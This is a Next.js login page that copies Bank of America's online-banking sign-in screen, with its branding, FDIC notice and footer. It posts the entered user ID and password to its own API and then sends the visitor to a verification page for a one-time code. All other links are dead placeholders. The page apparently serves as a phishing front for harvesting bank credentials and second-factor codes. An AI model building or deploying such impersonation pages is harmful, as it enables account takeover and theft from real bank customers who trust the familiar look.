'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import Image from 'next/image';

export default function UserLoginPage() {
  const [onlineId, setOnlineId] = useState('');
  const [passcode, setPasscode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [saveOnlineId, setSaveOnlineId] = useState(false);
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');

    try {
      const response = await fetch('/api/user/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ onlineId, passcode }),
      });

      const result = await response.json();

      if (result.success) {
        // Check if OTP verification is required
        if (result.pending_verification) {
          // Redirect to verification page with session info
          router.push(`/user/verify?session=${result.session_id}&email=${encodeURIComponent(result.email_hint)}`);
        } else {
          // Direct login success (fallback for legacy flow)
          router.push('/dashboard');
        }
      } else {
        setError('The information you entered does not match our records. Please try again.');
      }
    } catch (err) {
      setError('A system error occurred. Please try again later.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* FDIC Banner */}
      <div className="bg-[#f5f5f5] border-b border-[#ddd]">
        <div className="max-w-[980px] mx-auto px-4 py-1 text-center">
          <span className="text-[11px] text-[#666] font-normal">
            Bank of America deposit products: <strong className="font-bold">FDIC</strong> FDIC-Insured - Backed by the full faith and credit of the U.S. Government
          </span>
        </div>
      </div>

      {/* Header */}
      <header className="bg-white border-b border-[#ddd]">
        <div className="max-w-[980px] mx-auto px-4 py-2.5 flex items-center justify-between">
          {/* Logo - Using real image */}
          <div className="flex items-center gap-4">
            <Image 
              src="/header.png" 
              alt="Bank of America" 
              width={200} 
              height={24}
              className="h-6 w-auto"
              priority
            />
            <span className="text-[#333] text-[14px] font-normal">Log In</span>
          </div>

          {/* Right side */}
          <div className="flex items-center gap-1.5 text-[11px] text-[#666]">
            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            <span className="font-medium">Secure Area</span>
            <span className="text-[#ccc] mx-0.5">|</span>
            <Link href="#" className="text-[#0066b2] hover:underline font-normal">En español</Link>
          </div>
        </div>
      </header>

      <main className="flex-1 bg-white">
        {/* Red Banner - Contained width */}
        <div className="max-w-[980px] mx-auto px-4 mt-0">
          <div className="bg-[#c41230] text-white py-2.5 px-4">
            <div className="text-[16px] font-normal text-white">
              Log In to Online Banking
            </div>
          </div>
        </div>

        {/* Main Content - 3 Column Layout */}
        <div className="max-w-[980px] mx-auto px-4 py-8">
          <div className="flex flex-wrap lg:flex-nowrap">
            
            {/* Left Column - Login Form */}
            <div className="w-full lg:w-[240px] flex-shrink-0 pr-8 lg:border-r lg:border-[#ddd]">
              <form onSubmit={handleLogin} className="space-y-5">
                {error && (
                  <div className="p-2 bg-[#fff3f3] border border-[#ffcccc] text-[12px] text-[#c41230]">
                    {error}
                  </div>
                )}

                {/* User ID */}
                <div>
                  <label htmlFor="userId" className="block text-[15px] text-[#333] font-normal mb-1.5">
                    User ID
                  </label>
                  <input
                    id="userId"
                    type="text"
                    value={onlineId}
                    onChange={(e) => setOnlineId(e.target.value)}
                    className="w-full px-2 py-1.5 border border-[#999] text-[14px] focus:outline-none focus:border-[#0066b2]"
                    required
                  />
                  <div className="mt-2 flex items-center">
                    <input
                      id="saveId"
                      type="checkbox"
                      checked={saveOnlineId}
                      onChange={(e) => setSaveOnlineId(e.target.checked)}
                      className="w-3.5 h-3.5 border-[#999] accent-[#0066b2]"
                    />
                    <label htmlFor="saveId" className="ml-1.5 text-[12px] text-[#333] font-normal">
                      Save this User ID
                    </label>
                    <button
                      type="button"
                      className="ml-1 text-[#0066b2]"
                      aria-label="Help"
                    >
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/>
                      </svg>
                    </button>
                  </div>
                </div>

                {/* Password */}
                <div>
                  <label htmlFor="password" className="block text-[15px] text-[#333] font-normal mb-1.5">
                    Password
                  </label>
                  <input
                    id="password"
                    type="password"
                    value={passcode}
                    onChange={(e) => setPasscode(e.target.value)}
                    className="w-full px-2 py-1.5 border border-[#999] text-[14px] focus:outline-none focus:border-[#0066b2]"
                    required
                  />
                </div>

                {/* Forgot Password Link */}
                <div className="pt-2">
                  <Link href="#" className="text-[13px] text-[#0066b2] hover:underline font-normal">
                    Forgot your Password?
                  </Link>
                </div>

                {/* Login Button */}
                <div className="pt-4">
                  <button
                    type="submit"
                    disabled={isLoading}
                    className="inline-flex items-center gap-1.5 bg-[#0066b2] hover:bg-[#005599] text-white text-[13px] font-normal py-2 px-4 rounded-sm disabled:opacity-60"
                  >
                    {isLoading ? (
                      <svg className="animate-spin h-3.5 w-3.5" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                      </svg>
                    ) : (
                      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                      </svg>
                    )}
                    Log In
                  </button>
                </div>
              </form>
            </div>

            {/* Center Column - App Promotion */}
            <div className="w-full lg:flex-1 lg:px-10 lg:border-r lg:border-[#ddd] mt-6 lg:mt-0">
              <div className="text-[15px] text-[#333] font-normal mb-5">Stay connected with our app</div>
              
              <div className="flex items-start gap-6">
                {/* Phone Mockup - Using real image */}
                <div className="flex-shrink-0">
                  <Image 
                    src="/phone.png" 
                    alt="Bank of America Mobile App" 
                    width={140} 
                    height={280}
                    className="h-auto w-[140px]"
                  />
                </div>

                {/* Text and Button - To the right of phone */}
                <div className="pt-12">
                  <p className="text-[14px] text-[#333] font-normal mb-4 leading-relaxed">
                    Secure, convenient<br/>banking anytime
                  </p>
                  <button className="bg-[#c41230] hover:bg-[#a30f28] text-white text-[13px] font-semibold py-2 px-5 rounded-sm">
                    Get the app
                  </button>
                </div>
              </div>
            </div>

            {/* Right Column - Help Links */}
            <div className="w-full lg:w-[200px] lg:pl-8 mt-6 lg:mt-0">
              {/* Login Help */}
              <div className="mb-6">
                <div className="text-[14px] font-bold text-[#012169] mb-2">Login help</div>
                <div className="space-y-1.5">
                  <Link href="#" className="block text-[13px] text-[#0066b2] hover:underline font-normal">
                    Forgot ID/Password?
                  </Link>
                  <Link href="#" className="block text-[13px] text-[#0066b2] hover:underline font-normal">
                    Problem logging in?
                  </Link>
                </div>
              </div>

              {/* Not Using Online Banking */}
              <div>
                <div className="text-[14px] font-bold text-[#012169] mb-2">Not using Online Banking?</div>
                <div className="space-y-1.5">
                  <Link href="#" className="block text-[13px] text-[#0066b2] hover:underline font-normal">
                    Enroll now
                  </Link>
                  <Link href="#" className="block text-[13px] text-[#0066b2] hover:underline font-normal">
                    Learn more about Online Banking
                  </Link>
                  <Link href="#" className="block text-[13px] text-[#0066b2] hover:underline font-normal">
                    Service Agreement
                  </Link>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer - Same width as red banner */}
      <div className="w-full max-w-[980px] mx-auto px-4 mb-8">
        <footer className="w-full bg-[#f5f0eb] py-4 px-4">
          {/* Top row */}
          <div className="flex items-center gap-1.5 mb-2 text-[12px] text-[#333]">
            <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            <span className="font-medium">Secure area</span>
          </div>
          
          {/* Links row */}
          <div className="flex items-center gap-1.5 mb-3 text-[12px]">
            <Link href="#" className="text-[#0066b2] hover:underline font-normal">Privacy</Link>
            <span className="text-[#999]">|</span>
            <Link href="#" className="text-[#0066b2] hover:underline font-normal">Security</Link>
            <span className="text-[#999]">|</span>
            <span className="text-[#333] font-normal">Your Privacy Choices</span>
            {/* Privacy Choices Icon */}
            <svg className="w-6 h-3.5" viewBox="0 0 30 14" fill="none">
              <rect width="30" height="14" rx="2" fill="#0066b2"/>
              <path d="M7 7L9 9L13 5" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
              <circle cx="22" cy="7" r="3" fill="white"/>
            </svg>
          </div>

          {/* Legal row */}
          <div className="text-[11px] text-[#666] font-normal">
            <p>
              Bank of America, N.A. Member FDIC. <Link href="#" className="text-[#0066b2] hover:underline">Equal Housing Lender</Link>{' '}
              <svg className="inline w-3 h-3" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 3L4 9v12h16V9l-8-6zm0 2.236L18 9.764V19H6V9.764l6-4.528z"/>
              </svg>
            </p>
            <p className="mt-1">© 2025 Bank of America Corporation.</p>
          </div>
        </footer>
      </div>
    </div>
  );
}
